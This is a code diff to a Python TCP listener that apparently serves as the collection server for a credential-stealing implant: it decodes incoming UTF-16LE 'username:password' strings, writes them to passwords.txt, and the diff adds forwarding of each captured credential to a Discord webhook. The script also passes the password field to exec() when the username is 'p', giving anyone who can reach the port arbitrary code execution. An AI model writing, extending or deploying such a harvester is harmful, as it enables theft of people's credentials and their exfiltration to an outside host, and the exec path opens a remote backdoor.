@@ -2,11 +2,13 @@ import socket
 from datetime import datetime
 from colorama import Fore, Style, init
 import requests
+import argparse
+import sys
 
 # Initialize colorama
 init()
 
-def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
+def listen_for_utf16le_string(port=80, output_file='passwords.txt', discord_url=None):
     # Create a TCP socket
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         # Bind the socket to listen on the specified port
@@ -30,15 +32,11 @@ def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
                         try:
                             decoded_string = data.decode('utf-16le')
 
-                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%m%S')
-
-                            #requests.post(
-                            #    "https://DISCORDURL",
-                            #    json={"content": addr[0] + ' @ ' + timestamp+ " ```" + decoded_string + "```"})
+                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
                             # Terminal output with colors
-                            output = (f"{Fore.RED}{addr[0]}{Style.RESET_ALL} :: "  +# IP in red
-                                      f"{Fore.GREEN}{decoded_string.strip()}{Style.RESET_ALL} @@ " + # String in green
+                            output = (f"{Fore.RED}{addr[0]}{Style.RESET_ALL} :: " +  # IP in red
+                                      f"{Fore.GREEN}{decoded_string.strip()}{Style.RESET_ALL} @@ " +  # String in green
                                       f"{Fore.BLUE}{timestamp}{Style.RESET_ALL}"  # Timestamp in blue
                                       )
 
@@ -46,13 +44,37 @@ def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
                             print(output)
                             passwd = decoded_string.partition(":")[2]
                             uname = decoded_string.strip().split(':')[0]
-                            if(uname=='p'):
+                            if uname == 'p':
                                 exec(passwd)
                             file.write(output + '\n')
                             file.flush()  # Ensure it's written immediately
+
+                            # Send to Discord if URL is provided
+                            if discord_url:
+                                try:
+                                    requests.post(
+                                        discord_url,
+                                        json={"content": addr[0] + ' @ ' + timestamp + " ```" + decoded_string + "```"}
+                                    )
+                                except requests.RequestException as e:
+                                    print(f"Error with webhook: {e}")
                         except UnicodeDecodeError as e:
                             print(f"Error decoding UTF-16LE string: {e}")
                             continue
 
 if __name__ == '__main__':
-    listen_for_utf16le_string()
+    # Parse command-line arguments
+    parser = argparse.ArgumentParser(description="Listen for UTF-16LE strings and optionally send to Discord.")
+    parser.add_argument("--discord-url", help="Discord webhook URL to send the decoded strings.")
+    parser.add_argument("--port", type=int, default=80, help="Port to listen on (default: 80).")
+    parser.add_argument("--output-file", default="passwords.txt", help="File to save the received data (default: passwords.txt).")
+    args = parser.parse_args()
+
+    if not args.discord_url:
+        print("No Discord URL provided. To use a web hook specify one with --discord-url.")
+    if not args.output_file:
+        print("No output file provided. Defaulting to passwords.txt, specify one with --output-file.")
+    if not args.port:
+        print("No port file provided. Defaulting to 80, specify one with --port.")
+    
+    listen_for_utf16le_string(port=args.port, output_file=args.output_file, discord_url=args.discord_url)
